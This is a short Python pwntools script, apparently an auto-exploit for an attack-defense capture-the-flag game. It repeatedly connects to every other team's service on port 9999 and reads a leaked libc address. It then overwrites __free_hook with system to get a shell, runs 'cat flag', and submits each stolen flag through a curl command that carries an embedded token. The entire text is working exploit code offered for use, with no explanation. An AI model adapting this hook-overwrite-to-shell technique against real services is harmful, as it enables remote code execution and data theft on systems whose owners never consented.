# by mathboy7
import sys
from random import randrange
from pwn import *

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            r = remote('172.30.%d.12' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                r.close()
                continue

            r.recvuntil("libc_base=0x")
            rv = int(r.recvuntil("\n")[:-1], 16)
            libc_base = rv
            sh = libc_base + 0x1b3e9a
            system = libc_base + 0x4f440

            # print "libc: " + hex(rv)

            for i in range(5):
                r.recvuntil("Addr:")
                r.sendline(str(libc_base+0x3ed8e8))
                r.recvuntil("Value:")
                r.sendline(str(system))

            r.sendline("free")
            r.sendline("1")
            r.sendline(str(sh))
            r.sendline("cat flag")

            r.recvuntil("Trigger!\n")
            flag = r.recvuntil("\n").strip()

            # print "flag: " + flag
            r.close()

            if len(flag) > 0:
                submit_flag(team, flag)
        except Exception as e:
            print e

    sleep(5)
